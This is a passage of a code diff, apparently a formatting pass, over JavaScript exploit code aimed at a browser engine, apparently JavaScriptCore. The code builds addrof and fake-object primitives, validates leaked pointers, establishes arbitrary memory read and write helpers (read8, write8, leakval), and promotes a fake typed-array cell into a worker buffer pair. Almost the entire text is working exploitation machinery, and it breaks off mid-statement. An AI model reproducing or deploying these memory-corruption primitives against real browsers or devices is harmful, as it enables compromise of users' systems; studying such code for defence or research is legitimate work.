+      } catch {}
       retrySafe = true;
       compositionError = error;
       compositionState = -1;
@@ -867,17 +1023,15 @@
       void new Blob([line], { type: "text/plain" });
       try {
         sessionStorage.setItem(burstKey, line);
-      } catch {
-      }
-    } catch {
-    }
+      } catch {}
+    } catch {}
   }
   function beginComposition() {
     if (captureState === 0) {
       finishEarlySafeAttempt(
         "ADDROF-NO-RESULT",
         "capture-task-did-not-finish",
-        "addrof-no-result"
+        "addrof-no-result",
       );
       return;
     }
@@ -885,7 +1039,7 @@
       finishEarlySafeAttempt(
         "ADDROF-THREW",
         `${captureError?.name}:` + String(captureError?.message).slice(0, 80),
-        "addrof-threw"
+        "addrof-threw",
       );
       return;
     }
@@ -895,20 +1049,27 @@
     const b1 = pointerFromWords(capturedWords, 12);
     const repeated = a0 === a1 && b0 === b1;
     const distinct = a0 !== b0;
-    const plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
+    const plausible =
+      plausibleCell(a0) &&
+      plausibleCell(b0) &&
+      plausibleCell(a1) &&
+      plausibleCell(b1);
     const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
     const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
     emit("ADDROF-RETURNED", REVISION);
-    emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
+    emit(
+      "ADDROF-COPY",
+      `chars=${copiedLength}-source-covered=${sourceCovered}`,
+    );
     emit(
       "ADDROF-POINTERS",
-      `HOST=${hex(a0)}-TARGET=${hex(b0)}-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`
+      `HOST=${hex(a0)}-TARGET=${hex(b0)}-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`,
     );
     if (!(repeated && distinct && plausible && sourceCovered)) {
       finishEarlySafeAttempt(
         "ADDROF-FAIL",
         `repeat=${repeated}-distinct=${distinct}-plausible=${plausible}-covered=${sourceCovered}`,
-        "addrof-validation"
+        "addrof-validation",
       );
       return;
     }
@@ -916,11 +1077,18 @@
     targetAddress = b0;
     targetAddressHigh = Math.floor(targetAddress / 4294967296);
     targetAddressLow = targetAddress - targetAddressHigh * 4294967296;
-    if (targetAddressHigh < 0 || targetAddressHigh > 65535 || targetAddressLow < 0 || targetAddressLow > 4294967295 || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 4294967296 !== targetAddress) {
+    if (
+      targetAddressHigh < 0 ||
+      targetAddressHigh > 65535 ||
+      targetAddressLow < 0 ||
+      targetAddressLow > 4294967295 ||
+      Math.floor(targetAddressLow) !== targetAddressLow ||
+      targetAddressLow + targetAddressHigh * 4294967296 !== targetAddress
+    ) {
       finishEarlySafeAttempt(
         "TARGET-ADDRESS-FAIL",
         `target=${hex(targetAddress)}`,
-        "target-address"
+        "target-address",
       );
       return;
     }
@@ -929,13 +1097,13 @@
       finishEarlySafeAttempt(
         "FAKE-ADDRESS-FAIL",
         `host=${hex(hostAddress)}`,
-        "fake-address"
+        "fake-address",
       );
       return;
     }
     emit(
       "FAKE-ADDRESS",
-      `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}-delta=0x10`
+      `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}-delta=0x10`,
     );
     runGroomAndLoad();
   }
@@ -943,7 +1111,8 @@
     if (compositionState < 0) {
       emit(
         retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
-        `${compositionError?.name}:` + String(compositionError?.message).slice(0, 80)
+        `${compositionError?.name}:` +
+          String(compositionError?.message).slice(0, 80),
       );
       if (!retrySafe) failed();
       else scheduleSafeRetry("placement-throw");
@@ -956,13 +1125,19 @@
     }
     if (compositionState === 3) {
       emit(
-        identityResult === -1 ? "CARRIER-IDENTITY-FAIL" : zeroHeaderMiss ? "ZERO-HEADER-MISS" : retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH",
-        `rw=${rwHeaderOK}-holder=${holderHeaderOK}-function=${functionHeaderOK}-native-executable=${nativeExecutableHeaderOK}-repeat=${pointersRepeated}-retry-safe=${retrySafe}-identity=${identityResult}-hex=${dumpHex(rwHeader, CELL_BYTES)}`
+        identityResult === -1
+          ? "CARRIER-IDENTITY-FAIL"
+          : zeroHeaderMiss
+            ? "ZERO-HEADER-MISS"
+            : retrySafe
+              ? "COMPOSITION-LENGTH-MISS"
+              : "VALIDATION-MISMATCH",
+        `rw=${rwHeaderOK}-holder=${holderHeaderOK}-function=${functionHeaderOK}-native-executable=${nativeExecutableHeaderOK}-repeat=${pointersRepeated}-retry-safe=${retrySafe}-identity=${identityResult}-hex=${dumpHex(rwHeader, CELL_BYTES)}`,
       );
       if (!retrySafe) failed();
       else
         scheduleSafeRetry(
-          zeroHeaderMiss ? "zero-header-miss" : "composition-length-mismatch"
+          zeroHeaderMiss ? "zero-header-miss" : "composition-length-mismatch",
         );
       return;
     }
@@ -973,26 +1148,34 @@
     }
     emit(
       "SSV-RETURNED-CLEARED",
-      `length=${compositionLength}-predecessor-cleared=true`
+      `length=${compositionLength}-predecessor-cleared=true`,
     );
     emit(
       "RW-CARRIER",
-      `sid=${hex(profile.carrierSID)}-vector=${hex(rwOriginalVector)}-length=${hex(uint32At(rwHeader, 24))}-mode=${hex(profile.carrierMode)}`
+      `sid=${hex(profile.carrierSID)}-vector=${hex(rwOriginalVector)}-length=${hex(uint32At(rwHeader, 24))}-mode=${hex(profile.carrierMode)}`,
     );
     emit(
       "HOLDER",
-      `cell=${hex(targetAddress)}-textarea=${hex(anchorElementAddress)}-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`
+      `cell=${hex(targetAddress)}-textarea=${hex(anchorElementAddress)}-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`,
     );
     emit(
       "JSC-PROFILE",
-      `u8=${hex(profile.carrierType)}-u8flags=${hex(profile.carrierFlags)}-mode=${hex(profile.carrierMode)}-obj=${hex(profile.holderType)}-objflags=${hex(profile.holderFlags)}-fn=${hex(profile.functionType)}-fnflags=${hex(profile.functionFlags)}-nx=${hex(profile.nativeExecType)}-nxflags=${hex(profile.nativeExecFlags)}`
+      `u8=${hex(profile.carrierType)}-u8flags=${hex(profile.carrierFlags)}-mode=${hex(profile.carrierMode)}-obj=${hex(profile.holderType)}-objflags=${hex(profile.holderFlags)}-fn=${hex(profile.functionType)}-fnflags=${hex(profile.functionFlags)}-nx=${hex(profile.nativeExecType)}-nxflags=${hex(profile.nativeExecFlags)}`,
     );
     emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
-    const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK && nativeExecutableHeaderOK && pointersRepeated && restoreObserved && compositionLength === EXPECTED_LENGTH && liveCandidate !== null;
+    const leakPass =
+      rwHeaderOK &&
+      holderHeaderOK &&
+      functionHeaderOK &&
+      nativeExecutableHeaderOK &&
+      pointersRepeated &&
+      restoreObserved &&
+      compositionLength === EXPECTED_LENGTH &&
+      liveCandidate !== null;
     if (!leakPass) {
       emit(
         "READ-PRIMITIVE-MISMATCH",
-        `rw=${rwHeaderOK}-holder=${holderHeaderOK}-function=${functionHeaderOK}-native=${nativeExecutableHeaderOK}-repeat=${pointersRepeated}-restore=${restoreObserved}`
+        `rw=${rwHeaderOK}-holder=${holderHeaderOK}-function=${functionHeaderOK}-native=${nativeExecutableHeaderOK}-repeat=${pointersRepeated}-restore=${restoreObserved}`,
       );
       liveCandidate = null;
       failed();
@@ -1000,12 +1183,11 @@
     }
     emit(
       "READ-PRIMITIVE-PASS",
-      "arbitrary-read-established-firmware-offsets-asserted=none"
+      "arbitrary-read-established-firmware-offsets-asserted=none",
     );
     try {
       history.replaceState(null, "");
-    } catch {
-    }
+    } catch {}
     stopped = true;
     running = false;
     const resolve = settleResolve;
@@ -1052,10 +1234,15 @@
       hostAddress,
       fakeAddress,
       assertHome() {
-        if (liveCandidate === null || rwView === null || targetView === null || rwMirror === null)
+        if (
+          liveCandidate === null ||
+          rwView === null ||
+          targetView === null ||
+          rwMirror === null
+        )
           return false;
         return rwView[0] === 60 && rwMirror[0] === 60 && targetView[0] === 165;
-      }
+      },
     };
   }
   function establishPrimitive(options) {
@@ -1063,23 +1250,34 @@
     if (fakeReleased)
       return Promise.reject(
         new Error(
-          "core: the fake cell has been released to the real-cell pair -- establishPrimitive cannot run again in this page"
-        )
+          "core: the fake cell has been released to the real-cell pair -- establishPrimitive cannot run again in this page",
+        ),
       );
     if (running) return Promise.reject(new Error("core: already running"));
-    if (typeof BigInt !== "function" || typeof MessageChannel !== "function" || typeof Symbol !== "function" || typeof history === "undefined" || typeof history.replaceState !== "function")
+    if (
+      typeof BigInt !== "function" ||
+      typeof MessageChannel !== "function" ||
+      typeof Symbol !== "function" ||
+      typeof history === "undefined" ||
+      typeof history.replaceState !== "function"
+    )
       return Promise.reject(new Error("core: unsupported browser"));
     onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
-    criticalBarrier = typeof opts.beforeCriticalLoad === "function" ? opts.beforeCriticalLoad : defaultCriticalBarrier;
+    criticalBarrier =
+      typeof opts.beforeCriticalLoad === "function"
+        ? opts.beforeCriticalLoad
+        : defaultCriticalBarrier;
     if (criticalBarrier === defaultCriticalBarrier) ensureBarrierNode();
-    attemptCeiling = typeof opts.maxAttempts === "number" && opts.maxAttempts > 0 ? opts.maxAttempts : 0;
+    attemptCeiling =
+      typeof opts.maxAttempts === "number" && opts.maxAttempts > 0
+        ? opts.maxAttempts
+        : 0;
     running = true;
     stopped = false;
     attemptNumber = 1;
     try {
       sessionStorage.removeItem(attemptKey);
-    } catch {
-    }
+    } catch {}
     return new Promise((resolve, reject) => {
       settleResolve = resolve;
       settleReject = reject;
@@ -1099,7 +1297,7 @@
     "outerGraph",
     "fillerGraph",
     "referenceTarget",
-    "keepAlive"
+    "keepAlive",
   ];
   function releaseFakeCell() {
     const report = {
@@ -1107,7 +1305,7 @@
       alreadyReleased: fakeReleased,
       hostAddress,
       fakeAddress,
-      historyCleared: false
+      historyCleared: false,
     };
     if (fakeReleased) return report;
     liveCandidate = null;
@@ -1126,8 +1324,7 @@
     try {
       history.replaceState(null, "");
       report.historyCleared = history.state === null;
-    } catch (_) {
-    }
+    } catch (_) {}
     fakeReleased = true;
     stopped = true;
     running = false;
@@ -1156,8 +1353,8 @@
     this.low = low >>> 0;
     this.hi = hi >>> 0;
     this.backing = null;
-    this.add32inplace = function(val) {
-      let new_lo = ((this.low >>> 0) + val & 4294967295) >>> 0;
+    this.add32inplace = function (val) {
+      let new_lo = (((this.low >>> 0) + val) & 4294967295) >>> 0;
       let new_hi = this.hi >>> 0;
       if (new_lo < this.low) {
         new_hi++;
@@ -1171,12 +1368,12 @@
         this.backing = new Uint8Array(
           this.backing.buffer,
           val,
-          this.backing.byteLength - val
+          this.backing.byteLength - val,
         );
       }
     };
-    this.add32 = function(val) {
-      let new_lo = ((this.low >>> 0) + val & 4294967295) >>> 0;
+    this.add32 = function (val) {
+      let new_lo = (((this.low >>> 0) + val) & 4294967295) >>> 0;
       let new_hi = this.hi >>> 0;
       if (new_lo < this.low) {
         new_hi++;
@@ -1189,39 +1386,39 @@
         ret.backing = new Uint8Array(
           this.backing.buffer,
           val,
-          this.backing.byteLength - val
+          this.backing.byteLength - val,
         );
       }
       return ret;
     };
-    this.sub32 = function(val) {
-      let new_lo = ((this.low >>> 0) - val & 4294967295) >>> 0;
+    this.sub32 = function (val) {
+      let new_lo = (((this.low >>> 0) - val) & 4294967295) >>> 0;
       let new_hi = this.hi >>> 0;
-      if (new_lo > this.low & 4294967295) {
+      if ((new_lo > this.low) & 4294967295) {
         new_hi--;
       }
       return new int64(new_lo, new_hi);
     };
-    this.sub32inplace = function(val) {
-      let new_lo = ((this.low >>> 0) - val & 4294967295) >>> 0;
+    this.sub32inplace = function (val) {
+      let new_lo = (((this.low >>> 0) - val) & 4294967295) >>> 0;
       let new_hi = this.hi >>> 0;
-      if (new_lo > this.low & 4294967295) {
+      if ((new_lo > this.low) & 4294967295) {
         new_hi--;
       }
       this.hi = new_hi;
       this.low = new_lo;
     };
-    this.and32 = function(val) {
+    this.and32 = function (val) {
       let new_lo = this.low & val;
       let new_hi = this.hi;
       return new int64(new_lo, new_hi);
     };
-    this.and64 = function(vallo, valhi) {
+    this.and64 = function (vallo, valhi) {
       let new_lo = this.low & vallo;
       let new_hi = this.hi & valhi;
       return new int64(new_lo, new_hi);
     };
-    this.toString = function(radix = 16) {
+    this.toString = function (radix = 16) {
       let lo_str = (this.low >>> 0).toString(radix);
       let hi_str = (this.hi >>> 0).toString(radix);
       if (this.hi == 0) {
@@ -1260,7 +1457,7 @@
     const address = addrNumber(addrLike);
     if (size > carrier.windowBytes)
       throw new RangeError(
-        `mem: ${size} exceeds the ${carrier.windowBytes}-byte window`
+        `mem: ${size} exceeds the ${carrier.windowBytes}-byte window`,
       );
     carrier.aim(address);
     return address;
@@ -1288,7 +1485,7 @@
     aimFor(addr, 2);
     try {
       const v = carrier.view;
-      return v[0] | v[1] << 8;
+      return v[0] | (v[1] << 8);
     } finally {
       carrier.restore();
     }
@@ -1297,7 +1494,7 @@
     aimFor(addr, 4);
     try {
       const v = carrier.view;
-      return (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
+      return (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
     } finally {
       carrier.restore();
     }
@@ -1307,8 +1504,8 @@
     aimFor(addr, 8);
     try {
       const v = carrier.view;
-      lo = (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
-      hi = (v[4] | v[5] << 8 | v[6] << 16 | v[7] << 24) >>> 0;
+      lo = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
+      hi = (v[4] | (v[5] << 8) | (v[6] << 16) | (v[7] << 24)) >>> 0;
     } finally {
       carrier.restore();
     }
@@ -1329,7 +1526,7 @@
     try {
       const view = carrier.view;
       view[0] = v & 255;
-      view[1] = v >>> 8 & 255;
+      view[1] = (v >>> 8) & 255;
     } finally {
       carrier.restore();
     }
@@ -1340,9 +1537,9 @@
     try {
       const view = carrier.view;
       view[0] = v & 255;
-      view[1] = v >>> 8 & 255;
-      view[2] = v >>> 16 & 255;
-      view[3] = v >>> 24 & 255;
+      view[1] = (v >>> 8) & 255;
+      view[2] = (v >>> 16) & 255;
+      view[3] = (v >>> 24) & 255;
     } finally {
       carrier.restore();
     }
@@ -1365,7 +1562,7 @@
         hi = 0;
       } else {
         throw new RangeError(
-          `mem.write8: ${value} exceeds 32 bits -- pass an int64`
+          `mem.write8: ${value} exceeds 32 bits -- pass an int64`,
         );
       }
     } else if (value !== null && typeof value === "object" && "low" in value) {
@@ -1379,19 +1576,19 @@
     try {
       const view = carrier.view;
       view[0] = lo & 255;
-      view[1] = lo >>> 8 & 255;
-      view[2] = lo >>> 16 & 255;
-      view[3] = lo >>> 24 & 255;
+      view[1] = (lo >>> 8) & 255;
+      view[2] = (lo >>> 16) & 255;
+      view[3] = (lo >>> 24) & 255;
       view[4] = hi & 255;
-      view[5] = hi >>> 8 & 255;
-      view[6] = hi >>> 16 & 255;
-      view[7] = hi >>> 24 & 255;
+      view[5] = (hi >>> 8) & 255;
+      view[6] = (hi >>> 16) & 255;
+      view[7] = (hi >>> 24) & 255;
     } finally {
       carrier.restore();
     }
   }
   function leakval(obj) {
-    if (obj === null || typeof obj !== "object" && typeof obj !== "function")
+    if (obj === null || (typeof obj !== "object" && typeof obj !== "function"))
       throw new TypeError("mem.leakval: not an object");
     carrier.setLeakSlot(obj);
     let lo, hi;
@@ -1399,17 +1596,17 @@
       aimFor(carrier.leakSlotAddress, 8);
       try {
         const v = carrier.view;
-        lo = (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
-        hi = (v[4] | v[5] << 8 | v[6] << 16 | v[7] << 24) >>> 0;
+        lo = (v[0] | (v[1] << 8) | (v[2] << 16) | (v[3] << 24)) >>> 0;
+        hi = (v[4] | (v[5] << 8) | (v[6] << 16) | (v[7] << 24)) >>> 0;
       } finally {
         carrier.restore();
       }
     } finally {
       carrier.clearLeakSlot();
     }
-    if (hi > 65535 || lo === 0 && hi === 0 || (lo & 7) !== 0)
+    if (hi > 65535 || (lo === 0 && hi === 0) || (lo & 7) !== 0)
       throw new Error(
-        `mem.leakval: implausible cell 0x${new int64(lo, hi).toString()}`
+        `mem.leakval: implausible cell 0x${new int64(lo, hi).toString()}`,
       );
     return new int64(lo, hi);
   }
@@ -1434,26 +1631,8 @@
   var PAIR_HEADER_BYTES = 32;
   var HOME_BYTE = 60;
   var WORKER_LENGTH_MAX = 4294967295;
-  var mainMagic = new Uint8Array([
-    99,
-    158,
-    31,
-    41,
-    210,
-    132,
-    11,
-    92
-  ]);
-  var workerMagic = new Uint8Array([
-    158,
-    55,
-    121,
-    185,
-    127,
-    74,
-    124,
-    21
-  ]);
+  var mainMagic = new Uint8Array([99, 158, 31, 41, 210, 132, 11, 92]);
+  var workerMagic = new Uint8Array([158, 55, 121, 185, 127, 74, 124, 21]);
   var workerHeader = new Uint8Array(PAIR_HEADER_BYTES);
   var identityBytes2 = new Uint8Array(8);
   var workerOriginalVector = new Uint8Array(8);
@@ -1499,13 +1678,26 @@
     leakvalAgrees: false,
     fakeAddress: null,
     fakeButterfly: null,
-    released: []
+    released: [],
   };
   function u32At(bytes, offset) {
-    return (bytes[offset] | bytes[offset + 1] << 8 | bytes[offset + 2] << 16 | bytes[offset + 3] << 24) >>> 0;
+    return (
+      (bytes[offset] |
+        (bytes[offset + 1] << 8) |
+        (bytes[offset + 2] << 16) |
+        (bytes[offset + 3] << 24)) >>>
+      0
+    );
   }
   function low48At2(bytes, offset) {
-    return bytes[offset] + bytes[offset + 1] * 256 + bytes[offset + 2] * 65536 + bytes[offset + 3] * 16777216 + bytes[offset + 4] * 4294967296 + bytes[offset + 5] * 1099511627776;
+    return (
+      bytes[offset] +
+      bytes[offset + 1] * 256 +
+      bytes[offset + 2] * 65536 +
+      bytes[offset + 3] * 16777216 +
+      bytes[offset + 4] * 4294967296 +
+      bytes[offset + 5] * 1099511627776
+    );
   }
   function canonical48(bytes, offset) {
     return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
@@ -1571,13 +1763,13 @@
       assertHome() {
         if (workerView === null || workerMirror === null) return false;
         return workerView[0] === HOME_BYTE && workerMirror[0] === HOME_BYTE;
-      }
+      },
     };
   }
   function brokenCarrier(why) {
     const die = () => {
       throw new Error(
-        `mem: the primitive is disabled -- the promotion failed and its rollback did not verify (${why})`
+        `mem: the primitive is disabled -- the promotion failed and its rollback did not verify (${why})`,
       );
     };
     return {
@@ -1597,7 +1789,7 @@
       validate: () => false,
       assertHome: () => false,
       profile: null,
-      pair: pairStatus
+      pair: pairStatus,
     };
   }
   function proveMagic(note, who, slot, at, expected, context) {
@@ -1606,7 +1798,7 @@
       at: target,
       expected: hexOf(expected, 8),
       found: null,
-      pass: false
+      pass: false,
     };
     pairStatus[slot] = record;
     readInto(identityBytes2, at, 8);
@@ -1614,11 +1806,11 @@
     record.pass = sameBytes2(identityBytes2, expected, 8);
     note(
       `PAIR-IDENTITY-${who.toUpperCase()}`,
-      `at=0x${target.toString()}-found=${record.found}-expected=${record.expected}-pass=${record.pass}-${context}`
+      `at=0x${target.toString()}-found=${record.found}-expected=${record.expected}-pass=${record.pass}-${context}`,
     );
     if (!record.pass)
       throw new Error(
-        `mem.promote: ${who} identity failed -- read ${record.found} at 0x${target.toString()}, expected ${record.expected} (${context})`
+        `mem.promote: ${who} identity failed -- read ${record.found} at 0x${target.toString()}, expected ${record.expected} (${context})`,
       );
     return record;
   }
@@ -1628,8 +1820,7 @@
       if (typeof onEvent2 === "function") {
         try {
           onEvent2(tag, detail === void 0 ? "" : String(detail));
-        } catch {
-        }
+        } catch {}
       }
     };
     if (pairStatus.promoted) throw new Error("mem.promote: already promoted");
@@ -1639,11 +1830,22 @@
       throw new Error("mem.promote: core.js already released the fake cell");
     const fake = carrier;
     const profile2 = fake.profile;
-    if (!profile2 || typeof profile2.vectorOffset !== "number" || typeof profile2.butterflyOffset !== "number" || typeof profile2.inlineSlotOffset !== "number")
+    if (
+      !profile2 ||
+      typeof profile2.vectorOffset !== "number" ||
+      typeof profile2.butterflyOffset !== "number" ||
+      typeof profile2.inlineSlotOffset !== "number"
+    )
       throw new TypeError("mem.promote: carrier has no layout profile");
-    if (typeof fake.hostAddress !== "number" || !fake.validate(fake.hostAddress) || typeof fake.fakeAddress !== "number" || !fake.validate(fake.fakeAddress) || fake.fakeAddress - fake.hostAddress !== profile2.inlineSlotOffset)
+    if (
+      typeof fake.hostAddress !== "number" ||
+      !fake.validate(fake.hostAddress) ||
+      typeof fake.fakeAddress !== "number" ||
+      !fake.validate(fake.fakeAddress) ||
+      fake.fakeAddress - fake.hostAddress !== profile2.inlineSlotOffset
+    )
       throw new TypeError(
-        `mem.promote: the fake cell's address is unusable (host=${fake.hostAddress} fake=${fake.fakeAddress})`
+        `mem.promote: the fake cell's address is unusable (host=${fake.hostAddress} fake=${fake.fakeAddress})`,
       );
     const VECTOR_OFF = profile2.vectorOffset;
     const LENGTH_OFF = VECTOR_OFF + 8;
@@ -1658,13 +1860,16 @@
     try {
       note(
         "PAIR-BEGIN",
-        `window=${fake.windowBytes}-vector=+${VECTOR_OFF}-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`
+        `window=${fake.windowBytes}-vector=+${VECTOR_OFF}-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`,
       );
       const mainRecord = carrierHeaderCopy();
       const mainHomeVector = carrierHomeVector();
-      if (!(mainRecord instanceof Uint8Array) || mainRecord.length < PAIR_HEADER_BYTES)
+      if (
+        !(mainRecord instanceof Uint8Array) ||
+        mainRecord.length < PAIR_HEADER_BYTES
+      )
         throw new Error(
-          "mem.promote: core.js's carrier record is the wrong shape"
+          "mem.promote: core.js's carrier record is the wrong shape",
         );
       const recordVector = low48At2(mainRecord, VECTOR_OFF);
       pairStatus.mainVector = toI64(mainHomeVector);
@@ -1673,31 +1878,35 @@
       pairStatus.structureID = u32At(mainRecord, 0);
       note(
         "PAIR-MAIN-RECORD",
-        `home=0x${pairStatus.mainVector.toString()}-record=0x${pairStatus.mainRecordVector.toString()}-len=${pairStatus.mainWindow}-mode=${mainRecord[MODE_OFF]}-sid=0x${(pairStatus.structureID >>> 0).toString(16)}`
+        `home=0x${pairStatus.mainVector.toString()}-record=0x${pairStatus.mainRecordVector.toString()}-len=${pairStatus.mainWindow}-mode=${mainRecord[MODE_OFF]}-sid=0x${(pairStatus.structureID >>> 0).toString(16)}`,
       );
       if (recordVector !== mainHomeVector)
         throw new Error(
-          `mem.promote: profile.vectorOffset disagrees with the recorded home vector (record 0x${pairStatus.mainRecordVector.toString()} vs home 0x${pairStatus.mainVector.toString()})`
+          `mem.promote: profile.vectorOffset disagrees with the recorded home vector (record 0x${pairStatus.mainRecordVector.toString()} vs home 0x${pairStatus.mainVector.toString()})`,
         );
       if (!fake.validate(mainHomeVector) || mainHomeVector % 8 !== 0)
         throw new Error(
-          `mem.promote: the recorded home vector is implausible (0x${pairStatus.mainVector.toString()})`
+          `mem.promote: the recorded home vector is implausible (0x${pairStatus.mainVector.toString()})`,
         );
       if (pairStatus.mainWindow !== fake.windowBytes)
         throw new Error(
-          `mem.promote: the record's m_length (${pairStatus.mainWindow}) is not the carrier window (${fake.windowBytes}) -- LENGTH_OFF does not hold on main`
+          `mem.promote: the record's m_length (${pairStatus.mainWindow}) is not the carrier window (${fake.windowBytes}) -- LENGTH_OFF does not hold on main`,
         );
       mainView = fake.view;
       retained.push(mainView);
-      if (!(mainView instanceof Uint8Array) || mainView.length !== fake.windowBytes || MAIN_IDENT_OFFSET + 8 > fake.windowBytes)
+      if (
+        !(mainView instanceof Uint8Array) ||
+        mainView.length !== fake.windowBytes ||
+        MAIN_IDENT_OFFSET + 8 > fake.windowBytes
+      )
         throw new Error(
-          "mem.promote: the carrier's view is not what core.js described"
+          "mem.promote: the carrier's view is not what core.js described",
         );
       pairStatus.fakeAddress = toI64(fake.fakeAddress);
       pairStatus.fakeButterfly = read8(fake.fakeAddress + BUTTERFLY_OFF);
       note(
         "PAIR-FAKE-BUTTERFLY",
-        `host=0x${toI64(fake.hostAddress).toString()}-fake=0x${pairStatus.fakeAddress.toString()}-butterfly=0x${pairStatus.fakeButterfly.toString()}`
+        `host=0x${toI64(fake.hostAddress).toString()}-fake=0x${pairStatus.fakeAddress.toString()}-butterfly=0x${pairStatus.fakeButterfly.toString()}`,
       );
       workerBuffer = new ArrayBuffer(WORKER_BUFFER_SIZE);
       workerView = new Uint8Array(workerBuffer);
@@ -1708,11 +1917,12 @@
         workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];
       if (workerView[0] !== HOME_BYTE)
         throw new Error("mem.promote: workerView does not alias workerMirror");
-      for (let i = 0; i < 8; ++i) mainView[MAIN_IDENT_OFFSET + i] = mainMagic[i];
+      for (let i = 0; i < 8; ++i)
+        mainView[MAIN_IDENT_OFFSET + i] = mainMagic[i];
       for (let i = 0; i < 8; ++i) {
         if (mainView[MAIN_IDENT_OFFSET + i] !== mainMagic[i])
           throw new Error(
-            "mem.promote: main's magic did not read back through its own JS view -- the carrier is not at home"
+            "mem.promote: main's magic did not read back through its own JS view -- the carrier is not at home",
           );
       }
       const mainAddr = addrNumber(leakval(mainView));
@@ -1721,7 +1931,7 @@
       pairStatus.workerAddress = toI64(workerAddr);
       note(
         "PAIR-CELLS",
-        `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}`
+        `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}`,
       );
       if (mainAddr === workerAddr)
         throw new Error("mem.promote: main and worker leaked the same cell");
@@ -1731,11 +1941,14 @@
       pairStatus.mainCellFromFakeSlot = fromFakeSlot;
       note(
         "PAIR-MAIN-CELL",
-        `fake-m_vector=0x${fromFakeSlot.toString()}-leakval=0x${pairStatus.mainAddress.toString()}-at=0x${toI64(fake.fakeAddress + VECTOR_OFF).toString()}`
+        `fake-m_vector=0x${fromFakeSlot.toString()}-leakval=0x${pairStatus.mainAddress.toString()}-at=0x${toI64(fake.fakeAddress + VECTOR_OFF).toString()}`,
       );
-      if (fromFakeSlot.low !== pairStatus.mainAddress.low || fromFakeSlot.hi !== pairStatus.mainAddress.hi)
+      if (
+        fromFakeSlot.low !== pairStatus.mainAddress.low ||
+        fromFakeSlot.hi !== pairStatus.mainAddress.hi
+      )
         throw new Error(
-          `mem.promote: main CELL identity failed -- the fake cell's m_vector slot holds 0x${fromFakeSlot.toString()} but leakval(mainView) says 0x${pairStatus.mainAddress.toString()}`
+          `mem.promote: main CELL identity failed -- the fake cell's m_vector slot holds 0x${fromFakeSlot.toString()} but leakval(mainView) says 0x${pairStatus.mainAddress.toString()}`,
         );
       proveMagic(
         note,
@@ -1743,7 +1956,7 @@
         "mainIdentity",
         mainHomeVector + MAIN_IDENT_OFFSET,
         mainMagic,
-        `home=0x${pairStatus.mainVector.toString()}-cell=0x${pairStatus.mainAddress.toString()}-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`
+        `home=0x${pairStatus.mainVector.toString()}-cell=0x${pairStatus.mainAddress.toString()}-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`,
       );
       readInto(workerHeader, workerAddr, PAIR_HEADER_BYTES);
       const workerVector = low48At2(workerHeader, VECTOR_OFF);
@@ -1754,12 +1967,26 @@
       pairStatus.workerButterfly = toI64(workerButterfly);
       note(
         "PAIR-WORKER-HEADER",
-        `sid=0x${u32At(workerHeader, 0).toString(16)}-vector=0x${pairStatus.workerVector.toString()}-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}-butterfly=0x${pairStatus.workerButterfly.toString()}`
+        `sid=0x${u32At(workerHeader, 0).toString(16)}-vector=0x${pairStatus.workerVector.toString()}-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}-butterfly=0x${pairStatus.workerButterfly.toString()}`,
       );
-      const gate = u32At(workerHeader, 0) === pairStatus.structureID && (workerHeader[7] === 0 || workerHeader[7] === 1) && pairStatus.workerWindow === WORKER_BUFFER_SIZE && workerHeader[MODE_OFF] === mainRecord[MODE_OFF] && workerHeader[MODE_OFF + 1] === 0 && workerHeader[MODE_OFF + 2] === 0 && workerHeader[MODE_OFF + 3] === 0 && canonical48(workerHeader, BUTTERFLY_OFF) && workerButterfly > 4294967296 && workerButterfly % 8 === 0 && canonical48(workerHeader, VECTOR_OFF) && fake.validate(workerVector) && workerVector % 8 === 0 && workerVector !== mainHomeVector;
+      const gate =
+        u32At(workerHeader, 0) === pairStatus.structureID &&
+        (workerHeader[7] === 0 || workerHeader[7] === 1) &&
+        pairStatus.workerWindow === WORKER_BUFFER_SIZE &&
+        workerHeader[MODE_OFF] === mainRecord[MODE_OFF] &&
+        workerHeader[MODE_OFF + 1] === 0 &&
+        workerHeader[MODE_OFF + 2] === 0 &&
+        workerHeader[MODE_OFF + 3] === 0 &&
+        canonical48(workerHeader, BUTTERFLY_OFF) &&
+        workerButterfly > 4294967296 &&
+        workerButterfly % 8 === 0 &&
+        canonical48(workerHeader, VECTOR_OFF) &&
+        fake.validate(workerVector) &&
+        workerVector % 8 === 0 &&
+        workerVector !== mainHomeVector;
       if (!gate)
         throw new Error(
